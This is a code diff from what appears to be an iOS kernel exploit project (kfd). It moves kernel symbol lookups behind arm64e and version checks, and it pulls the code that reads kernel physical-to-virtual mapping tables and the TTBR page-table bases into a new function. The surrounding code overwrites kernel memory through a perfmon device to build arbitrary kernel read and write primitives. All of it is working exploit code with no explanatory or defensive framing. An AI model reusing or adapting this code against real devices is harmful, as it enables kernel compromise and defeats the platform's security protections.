@@ -35,20 +35,24 @@ void perf_init(struct kfd* kfd)
     kfd->perf.shared_page.uaddr = shared_page_address;
     kfd->perf.shared_page.size = shared_page_size;
     
-    objcbridge *obj = [[objcbridge alloc] init];
-    kaddr_base = [obj find_base];
-    kaddr_vn_kqfilter = [obj find_vn_kqfilter];
-    kaddr_vm_pages = [obj find_vm_pages];
-    kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
-    kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
-    kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
-    kaddr_cdevsw = [obj find_cdevsw];
-    kaddr_perfmon_dev_open = [obj find_perfmon_dev_open];
-    kaddr_ptov_table = [obj find_ptov_table];
-    kaddr_gPhysBase = [obj find_gPhysBase];
-    kaddr_gPhysSize = [obj find_gPhysSize];
-    kaddr_gVirtBase = [obj find_gVirtBase];
-    kaddr_perfmon_devices = [obj find_perfmon_devices];
+    if(isarm64e()) {
+        objcbridge *obj = [[objcbridge alloc] init];
+        kaddr_ptov_table = [obj find_ptov_table];
+        kaddr_gPhysBase = [obj find_gPhysBase];
+        kaddr_gPhysSize = [obj find_gPhysSize];
+        kaddr_gVirtBase = [obj find_gVirtBase];
+        if(kfd->info.env.vid >= 6) {
+            kaddr_base = [obj find_base];
+            kaddr_vn_kqfilter = [obj find_vn_kqfilter];
+            kaddr_vm_pages = [obj find_vm_pages];
+            kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
+            kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
+            kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
+            kaddr_cdevsw = [obj find_cdevsw];
+            kaddr_perfmon_dev_open = [obj find_perfmon_dev_open];
+            kaddr_perfmon_devices = [obj find_perfmon_devices];
+        }
+    }
 }
 
 void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
@@ -104,6 +108,47 @@ void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
     *config = (volatile struct perfmon_config){};
     *source = (volatile struct perfmon_source){};
     *event = (volatile struct perfmon_event){};
+}
+
+void perf_ptov(struct kfd* kfd)
+{
+    /*
+     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
+     */
+    uint64_t ptov_table_kaddr = kaddr_ptov_table + kfd->info.kernel.kernel_slide;
+    kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
+
+    uint64_t gVirtBase_kaddr = kaddr_gVirtBase + kfd->info.kernel.kernel_slide;
+    kread_kfd((uint64_t)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
+    print_x64(kfd->info.kernel.gVirtBase);
+
+    uint64_t gPhysBase_kaddr = kaddr_gPhysBase + kfd->info.kernel.kernel_slide;
+    kread_kfd((uint64_t)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
+    print_x64(kfd->info.kernel.gPhysBase);
+
+    uint64_t gPhysSize_kaddr = kaddr_gPhysSize + kfd->info.kernel.kernel_slide;
+    kread_kfd((uint64_t)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
+    print_x64(kfd->info.kernel.gPhysSize);
+
+    assert(kfd->info.kernel.current_pmap);
+    uint64_t ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
+    uint64_t ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
+    kread_kfd((uint64_t)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
+    kread_kfd((uint64_t)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
+    assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);
+
+    assert(kfd->info.kernel.kernel_pmap);
+    uint64_t ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
+    uint64_t ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
+    kread_kfd((uint64_t)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
+    kread_kfd((uint64_t)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
+    assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);
+
+    /*
+     * Find the shared page in kernel space.
+     */
+    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
+    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);
 }
 
 void perf_run(struct kfd* kfd)
@@ -195,44 +240,8 @@ void perf_run(struct kfd* kfd)
     new_si_rdev_buffer[0] = dev_new_major;
     new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
     kwrite_kfd((uint64_t)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));
-
-    /*
-     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
-     */
-    uint64_t ptov_table_kaddr = kaddr_ptov_table + kernel_slide;
-    kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
-
-    uint64_t gVirtBase_kaddr = kaddr_gVirtBase + kernel_slide;
-    kread_kfd((uint64_t)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
-    print_x64(kfd->info.kernel.gVirtBase);
-
-    uint64_t gPhysBase_kaddr = kaddr_gPhysBase + kernel_slide;
-    kread_kfd((uint64_t)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
-    print_x64(kfd->info.kernel.gPhysBase);
-
-    uint64_t gPhysSize_kaddr = kaddr_gPhysSize + kernel_slide;
-    kread_kfd((uint64_t)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
-    print_x64(kfd->info.kernel.gPhysSize);
-
-    assert(kfd->info.kernel.current_pmap);
-    uint64_t ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
-    uint64_t ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
-    kread_kfd((uint64_t)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
-    kread_kfd((uint64_t)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
-    assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);
-
-    assert(kfd->info.kernel.kernel_pmap);
-    uint64_t ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
-    uint64_t ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
-    kread_kfd((uint64_t)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
-    kread_kfd((uint64_t)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
-    assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);
-
-    /*
-     * Find the shared page in kernel space.
-     */
-    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
-    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);
+    
+    perf_ptov(kfd);
 
     /*
      * Set up the perfmon device use for the master kread and kwrite:
